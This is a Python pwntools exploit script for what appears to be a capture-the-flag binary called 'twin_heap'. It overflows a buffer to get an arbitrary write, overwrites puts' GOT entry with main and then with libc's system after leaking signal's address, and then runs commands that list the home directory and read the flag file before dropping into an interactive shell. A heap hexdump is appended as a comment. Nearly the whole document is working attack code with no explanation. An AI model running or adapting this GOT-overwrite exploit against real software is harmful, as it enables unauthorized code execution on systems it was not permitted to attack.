from pwn import *

if len(sys.argv)==1:
    p=process("linux_server64")
elif sys.argv[1]=="1":
    p=process("./bin")
elif sys.argv[1]=="2":
    context.log_level='debug'
    p=process("./bin")
elif sys.argv[1]=="3":
    p=remote("functf",18012)

def readline(key):
    buf=p.readline()
    print buf
    while (buf.find(key)<0):
        buf=p.readline()
        print buf
    return buf

signal_got = 0x601030
put_got = 0x601018
main = 0x400831 
def do(read_addr, target_addr, change_value):
    buf=p.recvuntil("name:")    
    print buf    
    payload="/bin/sh"
    p.sendline(payload)    
        
    buf=p.recvuntil("address:")    
    print buf    
    payload="B"*0x38    
    payload+=p64(read_addr)
    payload+=p64(target_addr)
    p.sendline(payload)    
        
    buf=p.recvuntil("name:")    
    print buf    
    payload="a"
    #payload=p64(libc_start_main_got)[:-1]
    p.sendline(payload)    
        
    buf=p.recvuntil("address:")    
    print buf    
    payload=p64(change_value)[:-1]
    p.sendline(payload)    

#######################################################################
# phase 1. leak, change put to main
#######################################################################
do(signal_got, put_got, main)

buf=p.recvuntil("bye")
print hexdump(buf)

libc_signal = u64(buf[0x6b:0x6b+8])
print 'libc_signal:',hex(libc_signal)
libc_elf=ELF("/lib/x86_64-linux-gnu/libc.so.6")
libc_base=libc_signal-libc_elf.sym["signal"]
libc_system=libc_base+libc_elf.sym["system"]
print 'libc_base:',hex(libc_system)

#######################################################################
# phase 2. shell, change put to libc_system
#######################################################################
do(signal_got, put_got, libc_system)

p.sendline("id;ls -al /home/twin_heap;cat /home/twin_heap/flag")

p.interactive()

'''
0000000002484250  00 00 00 00 00 00 00 00  21 00 00 00 00 00 00 00  ........!.......
0000000002484260  01 00 00 00 00 00 00 00  80 42 48 02 00 00 00 00  .........BH.....
0000000002484270  B0 42 48 02 00 00 00 00  31 00 00 00 00 00 00 00  .BH.....1.......
0000000002484280  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
0000000002484290  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
00000000024842A0  00 00 00 00 00 00 00 00  31 00 00 00 00 00 00 00  ........1.......
00000000024842B0  42 42 42 42 42 42 42 42  42 42 42 42 42 42 42 42  BBBBBBBBBBBBBBBB
00000000024842C0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
00000000024842D0  00 00 00 00 00 00 00 00  21 00 00 00 00 00 00 00  ........!.......
00000000024842E0  02 00 00 00 00 00 00 00  00 43 48 02 00 00 00 00  .........CH.....
00000000024842F0  30 43 48 02 00 00 00 00  31 00 00 00 00 00 00 00  0CH.....1.......
0000000002484300  43 43 43 43 43 43 43 43  43 43 43 43 43 43 43 43  CCCCCCCCCCCCCCCC
0000000002484310  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
0000000002484320  00 00 00 00 00 00 00 00  31 00 00 00 00 00 00 00  ........1.......
0000000002484330  44 44 44 44 44 44 44 44  44 44 44 44 44 44 44 44  DDDDDDDDDDDDDDDD
0000000002484340  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
0000000002484350  00 00 00 00 00 00 00 00  B1 0C 02 00 00 00 00 00  ................
'''
